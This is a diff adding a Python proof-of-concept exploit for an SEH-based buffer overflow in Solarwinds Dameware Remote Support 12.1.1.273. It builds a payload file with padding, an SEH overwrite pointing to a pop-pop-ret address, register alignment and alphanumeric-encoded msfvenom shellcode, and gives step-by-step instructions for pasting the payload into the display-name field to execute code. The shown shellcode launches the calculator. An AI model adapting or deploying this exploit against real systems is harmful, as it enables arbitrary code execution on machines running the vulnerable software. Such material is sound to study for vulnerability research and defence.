@@ -1,0 +1,61 @@
+# Exploit Title: Dameware Remote Support 12.1.1.273 - Buffer Overflow (SEH)
+# Exploit Author: gurbanli
+# Date: 2020-05-13
+# Vulnerable Software: Solarwinds Dameware Remote Support 12.1.1.273
+# Vendor Homepage: https://www.solarwinds.com/
+# Version: 12.1.1.273
+# Software Link: https://downloads.solarwinds.com/solarwinds/Release/DameWare/v12.1.1/DamewareRS-St.exe
+# Tested on: Windows 7 x86
+
+"""
+poc
+1. Run exploit and copy contents of payload.txt
+2. Open Dameware Remote Support
+3. Click Add active directory support
+4. Write any ip address in name or ip address field
+5. paste payload .txt content to display name field and click ok
+6. Click ok when error pops up
+7. Click Yes in dialog box
+8. calc pops up
+
+Actually, i cant create this exploit with reliable exit, that's why calculator will be executed in background lol :D . but it is not big issue, the main thing is that arbitary code is executed 
+"""
+
+
+file = open('payload.txt','w')
+
+max_length = 3604
+
+
+padding_until_eax = '\x6e\x41' * 57 + '\x6e'
+align_eax = (
+"\x41" # padding (one byte)
+"\x6e" # padding
+"\x05\x14\x11" # add eax,11001400
+"\x6e" # padding
+"\x2d\x13\x11" # sub eax,11001300
+)
+
+'''
+msfvenom -p windows/exec cmd=calc -f raw > shellcode.raw
+./alpha2 eax --unicode --uppercase < shellcode.raw
+'''
+
+shellcode = 'PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXDBKPM0KPS0TIYUNQGPC4TKPPNPDK0RLLTK0RMDTKT2MXLO870JNF01KOFLOLQQSLLBNLMP7Q8OLMM1I7YRL22227DKR2LP4KOZOLTKPLLQRX9SQ8KQHQPQTKPYMPKQJ34KOYLXK3NZQ94KP44KKQXV01KOVLGQ8OLMKQ7WOHIPSEKFM3CML8OKSMMTRUK428DKPXMTM1HSC6TKLLPKTK0XMLKQYCTKKTTKM18PSYPDMTMT1KQK1QPYQJPQKOYPQO1O1J4KLRJKTM1MRJM1DMDEVRKPKPKPPPS8NQTK2OE7KOXUGKJPVUW2PVBH76EEGMUMKO9EOLKV3LLJCPKKK0RULEGKOWLS42RO1ZKPQCKOXUS3QQRL33KPA'
+
+
+
+'''
+ppr address 00b3007e (DNTU.exe)
+'''
+
+nSEH = '\x61\x6e' # unicode compatible padding
+SEH = '\x7e\xb3'
+
+payload = 'A' * 1764 + nSEH + SEH + align_eax + padding_until_eax + shellcode
+payload += 'A' * (max_length-len(payload))
+
+print('Payload length:{}'.format(len(payload)))
+
+file.write(payload)
+file.close()
